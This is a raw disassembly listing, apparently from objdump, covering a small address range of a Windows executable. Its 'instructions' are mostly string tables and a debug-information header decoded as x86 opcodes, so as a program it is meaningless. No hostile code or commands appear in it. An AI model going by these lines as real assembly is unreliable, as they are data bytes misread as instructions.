  434711:	adc    BYTE PTR [eax],al
  434713:	dec    ecx
  434714:	pop    eax
  434715:	adc    BYTE PTR [eax],al
  434717:	test   DWORD PTR [esi+0x43],0x4346fb00
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [ebp+0x57],cl
  434739:	xor    DWORD PTR [ecx],esi
  43473b:	cmp    BYTE PTR [edi+ebx*2],dh
  43473e:	push   ecx
  43473f:	add    BYTE PTR [edx+0x33],dl
  434742:	push   esi
  434743:	xor    eax,0x3849515f
  434748:	xor    al,0x59
  43474a:	push   edi
  43474b:	add    BYTE PTR [ebx+0x54],al
  43474e:	inc    ebp
  43474f:	pop    edi
  434750:	dec    ebx
  434751:	push   edx
  434752:	push   ebp
  434753:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434758:	pop    edi
  434759:	aaa    
  43475a:	xor    al,0x32
  43475c:	xor    BYTE PTR [edi+0x5f],al
  43475f:	inc    ebx
  434760:	pop    edx
  434761:	add    BYTE PTR [edi+0x4e],al
  434764:	cmp    DWORD PTR [edi+0x47],ebx
  434767:	push   ebx
  434768:	cmp    DWORD PTR [edi+0x4e],edx
  43476b:	add    BYTE PTR [ecx+0x44],dl
  43476e:	cmp    BYTE PTR [edi+0x33],bl
  434771:	cmp    BYTE PTR [eax],dh
  434773:	pop    edi
  434774:	inc    ecx
  434775:	dec    edi
  434776:	inc    esi
  434777:	push   eax
  434778:	add    BYTE PTR [edx+0x43],dl
  43477b:	xor    eax,0x41305f30
  434780:	xor    BYTE PTR [esi+0x5f],al
  434783:	inc    ebx
  434784:	xor    dh,BYTE PTR [edx]
  434786:	xor    eax,0x36545200
  43478b:	xor    al,0x5f
  43478d:	dec    esi
  43478e:	xor    esi,DWORD PTR [edx]
  434790:	add    BYTE PTR ss:[eax+0x4b],cl
  434794:	inc    ebx
  434795:	pop    edi
  434796:	ss xor al,0x34
  434799:	pop    edi
  43479a:	inc    ecx
  43479b:	push   esp
  43479c:	dec    edi
  43479d:	add    BYTE PTR [esi+0x52],dl
  4347a0:	push   esi
  4347a1:	pop    edi
  4347a2:	inc    esi
  4347a3:	push   ecx
  4347a4:	push   ebp
  4347a5:	push   edx
  4347a6:	dec    eax
  4347a7:	add    BYTE PTR [esi+0x41],cl
  4347aa:	inc    edx
  4347ab:	pop    edi
  4347ac:	xor    DWORD PTR [ecx],edi
  4347ae:	push   edi
  4347af:	pop    edi
  4347b0:	pop    edx
  4347b1:	xor    eax,0x47003934
  4347b6:	push   edx
  4347b7:	push   ebp
  4347b8:	pop    edi
  4347b9:	xor    al,BYTE PTR [edx+0x30]
  4347bc:	push   ebx
  4347bd:	dec    esi
  4347be:	xor    eax,0x38564300
  4347c3:	xor    al,0x5f
  4347c5:	xor    bl,BYTE PTR [eax+0x36]
  4347c8:	inc    edx
  4347c9:	pop    edi
  4347ca:	pop    ecx
  4347cb:	xor    al,BYTE PTR [ecx+0x0]
  4347ce:	push   edi
  4347cf:	dec    ecx
  4347d0:	push   ebx
  4347d1:	xor    DWORD PTR [eax],edi
  4347d3:	pop    edi
  4347d4:	push   ecx
  4347d5:	xor    BYTE PTR [edx+0x5f],cl
  4347d8:	inc    ecx
  4347d9:	add    BYTE PTR ss:[edx+0x45],al
  4347dd:	push   edi
  4347de:	cmp    DWORD PTR [eax],edi
  4347e0:	pop    edi
  4347e1:	inc    edx
  4347e2:	xor    eax,0x36520057
  4347e7:	aaa    
  4347e8:	xor    BYTE PTR [edi],dh
  4347ea:	pop    edi
  4347eb:	inc    edx
  4347ec:	cmp    DWORD PTR [edi+0x52],eax
  4347ef:	dec    esp
  4347f0:	pop    edi
  4347f1:	dec    ebx
  4347f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4347f6:	pop    edi
  4347f7:	push   ebp
  4347f8:	push   ebx
  4347f9:	aaa    
  4347fa:	dec    ebp
  4347fb:	pop    edi
  4347fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4347ff:	dec    ebx
  434800:	dec    edx
  434801:	add    BYTE PTR [edi+0x47],al
  434804:	xor    eax,0x534e5f32
  434809:	push   esp
  43480a:	pop    edi
  43480b:	push   esp
  43480c:	inc    edx
  43480d:	inc    esi
  43480e:	inc    esp
  43480f:	add    BYTE PTR [ebp+0x4e],al
  434812:	inc    edi
  434813:	cmp    DWORD PTR [edi+0x57],ebx
  434816:	push   eax
  434817:	push   ecx
  434818:	pop    edi
  434819:	dec    edi
  43481a:	inc    ebx
  43481b:	push   edi
  43481c:	pop    edi
  43481d:	inc    edi
  43481e:	add    BYTE PTR [edi+0x45],dl
  434821:	inc    esi
  434822:	pop    edi
  434823:	push   edx
  434824:	inc    edx
  434825:	pop    eax
  434826:	inc    edi
  434827:	ss pop edi
  434829:	push   esi
  43482a:	inc    ebx
  43482b:	dec    esi
  43482c:	inc    esp
  43482d:	add    BYTE PTR [edi+0x4d],cl
  434830:	inc    edi
  434831:	xor    ebx,DWORD PTR [edi+0x34]
  434834:	dec    esi
  434835:	pop    edx
  434836:	cmp    BYTE PTR [edi+0x58],bl
  434839:	cmp    BYTE PTR [eax],al
  43483b:	push   edx
  43483c:	pop    eax
  43483d:	push   ecx
  43483e:	pop    edi
  43483f:	dec    esp
  434840:	push   edx
  434841:	dec    ecx
  434842:	dec    edi
  434843:	inc    esp
  434844:	pop    edi
  434845:	dec    edi
  434846:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43484a:	push   eax
  43484b:	inc    ebp
  43484c:	pop    edi
  43484d:	xor    eax,0x565f3945
  434852:	add    BYTE PTR [edi+0x4e],al
  434855:	push   esi
  434856:	pop    edi
  434857:	inc    edi
  434858:	push   esp
  434859:	dec    eax
  43485a:	xor    dh,BYTE PTR [ecx]
  43485c:	pop    edi
  43485d:	dec    edi
  43485e:	xor    eax,DWORD PTR ss:[eax]
  434861:	inc    esp
  434862:	inc    ebp
  434863:	dec    ecx
  434864:	pop    edi
  434865:	push   edx
  434866:	dec    eax
  434867:	xor    al,0x48
  434869:	dec    ecx
  43486a:	ss pop edi
  43486c:	aaa    
  43486d:	aaa    
  43486e:	dec    ecx
  43486f:	dec    ebp
  434870:	add    BYTE PTR [eax+0x54],cl
  434873:	ss pop edi
  434875:	inc    esi
  434876:	inc    edx
  434877:	xor    dh,BYTE PTR [eax+eax*1]
  43487a:	dec    esi
  43487b:	ss dec edx
  43487d:	pop    edi
  43487e:	dec    ecx
  43487f:	dec    esp
  434880:	inc    edi
  434881:	inc    esp
  434882:	dec    eax
  434883:	xor    BYTE PTR [eax],bh
  434885:	xor    eax,0x34004f00
  43488a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43488e:	add    BYTE PTR [edi],dh
  434890:	add    BYTE PTR [eax],dh
  434892:	add    BYTE PTR [edi+0x0],bl
  434895:	inc    esp
  434896:	add    BYTE PTR [edi+0x0],al
  434899:	dec    ebx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [ecx+0x0],al
  43489f:	inc    ebx
  4348a0:	add    BYTE PTR [eax],al
  4348a2:	add    BYTE PTR [edi+0x0],cl
  4348a5:	xor    al,BYTE PTR [eax]
  4348a7:	xor    eax,DWORD PTR [eax]
  4348a9:	pop    edi
  4348aa:	add    BYTE PTR [edi+0x0],dl
  4348ad:	xor    al,BYTE PTR [eax]
  4348af:	dec    edi
  4348b0:	add    BYTE PTR [edi+0x0],bl
  4348b3:	pop    edx
  4348b4:	add    BYTE PTR [eax],al
  4348b6:	add    BYTE PTR [eax+0x0],bl
  4348b9:	dec    esp
  4348ba:	add    BYTE PTR [ecx],bh
  4348bc:	add    BYTE PTR [edi+0x0],bl
  4348bf:	dec    ebx
  4348c0:	add    BYTE PTR [ecx+0x0],al
  4348c3:	dec    edx
  4348c4:	add    BYTE PTR [esi+0x0],al
  4348c7:	xor    DWORD PTR [eax],eax
  4348c9:	xor    al,0x0
  4348cb:	pop    edi
  4348cc:	add    BYTE PTR [eax+0x0],bl
  4348cf:	inc    edi
  4348d0:	add    BYTE PTR [edx+0x0],al
  4348d3:	add    BYTE PTR [eax],al
  4348d5:	push   eax
  4348d6:	add    BYTE PTR [ebx],dh
  4348d8:	add    BYTE PTR [esi+0x0],cl
  4348db:	pop    edi
  4348dc:	add    BYTE PTR [eax+0x0],cl
  4348df:	xor    eax,0x5f005300
  4348e4:	add    BYTE PTR [eax+0x0],cl
  4348e7:	add    BYTE PTR [eax],al
  4348e9:	dec    ebp
  4348ea:	add    BYTE PTR [eax],dh
  4348ec:	add    BYTE PTR [edx+0x0],al
  4348ef:	pop    edi
  4348f0:	add    BYTE PTR [edx+0x0],cl
  4348f3:	pop    eax
  4348f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4348f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4348fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434900:	add    BYTE PTR [ecx+0x0],al
  434903:	xor    eax,DWORD PTR [eax]
  434905:	xor    BYTE PTR [eax],al
  434907:	pop    edi
  434908:	add    BYTE PTR [ecx+0x0],al
  43490b:	pop    edx
  43490c:	add    BYTE PTR [ecx+0x0],dl
  43490f:	pop    edx
  434910:	add    BYTE PTR [ecx],bh
  434912:	add    BYTE PTR [esi],dh
  434914:	add    BYTE PTR [edi+0x0],bl
  434917:	dec    eax
  434918:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43491c:	add    BYTE PTR [eax],al
  43491e:	add    BYTE PTR [ecx+0x0],dl
  434921:	push   edi
  434922:	add    BYTE PTR [ecx+0x0],bl
  434925:	pop    edi
  434926:	add    BYTE PTR [esi+0x0],dl
  434929:	xor    al,0x0
  43492b:	inc    esp
  43492c:	add    BYTE PTR [ecx],dh
  43492e:	add    BYTE PTR [eax],bh
  434930:	add    BYTE PTR [edx],dh
  434932:	add    BYTE PTR [edi+0x0],bl
  434935:	cmp    DWORD PTR [eax],eax
  434937:	push   esp
  434938:	add    BYTE PTR [eax+eax*1+0x0],dl
  43493c:	add    BYTE PTR [esi+0x0],dl
  43493f:	dec    edi
  434940:	add    BYTE PTR [edi+0x0],al
  434943:	add    BYTE PTR ss:[edi+0x0],bl
  434947:	dec    edi
  434948:	add    BYTE PTR [edx+0x0],bl
  43494b:	inc    ebp
  43494c:	add    BYTE PTR [eax],dh
  43494e:	add    BYTE PTR [ebp+0x0],al
  434951:	xor    BYTE PTR [eax],al
  434953:	pop    edi
  434954:	add    BYTE PTR [eax],dh
  434956:	add    BYTE PTR ds:0x4f000000,dh
  43495c:	add    BYTE PTR ds:0x5f005700,dh
  434962:	add    BYTE PTR [edi],dh
  434964:	add    BYTE PTR [ebx+0x0],dl
  434967:	push   ebp
  434968:	add    BYTE PTR [edi+0x0],al
  43496b:	xor    al,0x0
  43496d:	pop    edi
  43496e:	add    BYTE PTR [ecx+0x0],dl
  434971:	inc    esp
  434972:	add    BYTE PTR [eax],al
  434974:	add    BYTE PTR [edx+0x0],dl
  434977:	push   esp
  434978:	add    BYTE PTR ds:0x52005f00,dh
  43497e:	add    BYTE PTR [edi+0x0],dl
  434981:	xor    al,BYTE PTR [eax]
  434983:	xor    al,BYTE PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	xor    BYTE PTR [eax],al
  434989:	pop    edi
  43498a:	add    BYTE PTR [esi],dh
  43498c:	add    BYTE PTR [eax],al
  43498e:	add    BYTE PTR [eax+0x0],cl
  434991:	inc    ebp
  434992:	add    BYTE PTR [eax+eax*1+0x30],cl
  434996:	add    BYTE PTR [edi+0x0],bl
  434999:	dec    edx
  43499a:	add    BYTE PTR [edx],dh
  43499c:	add    BYTE PTR [edi],dh
  43499e:	add    BYTE PTR [ebp+0x0],dl
  4349a1:	add    BYTE PTR ss:[eax],dh
  4349a4:	add    BYTE PTR [eax],al
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	cmp    BYTE PTR [eax],al
  4349ab:	dec    edi
  4349ac:	add    BYTE PTR [ecx],bh
  4349ae:	add    BYTE PTR [edi+0x0],bl
  4349b1:	pop    eax
  4349b2:	add    BYTE PTR [edx+0x0],bl
  4349b5:	dec    esp
  4349b6:	add    BYTE PTR [ebx+0x0],cl
  4349b9:	add    BYTE PTR [eax],al
  4349bb:	dec    ecx
  4349bc:	add    BYTE PTR [ebp+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [eax],al
  4349c2:	add    BYTE PTR [edx+0x53],dl
  4349c5:	inc    esp
  4349c6:	push   ebx
  4349c7:	ins    DWORD PTR es:[edi],dx
  4349c8:	push   es
  4349c9:	imul   ebx,DWORD PTR [ecx+0x11],0x85405eeb
  4349d0:	sti    
  4349d1:	push   0x79c44d12
  4349d6:	lods   eax,DWORD PTR ds:[esi]
  4349d7:	sbb    al,BYTE PTR [eax]
  4349d9:	add    BYTE PTR [eax],al
  4349db:	push   ebx
  4349dc:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  4349e0:	jne    0x434a5b
  4349e2:	ins    DWORD PTR es:[edi],dx
  4349e3:	dec    ecx
  4349e4:	jb     0x434a60
  4349e6:	pop    esp
  4349e7:	bound  di,DWORD PTR [edx+0x52]
  4349eb:	gs fs push ax
  4349ef:	arpl   WORD PTR [esi+0x5c],si
  4349f2:	js     0x434a4e
  4349f4:	je     0x434a3d
  4349f6:	jno    0x434a3a
  4349f8:	jno    0x434a61
  4349fa:	bound  ebp,QWORD PTR [esi]
  4349fc:	jo     0x434a62
  4349fe:	bound  eax,QWORD PTR [eax]
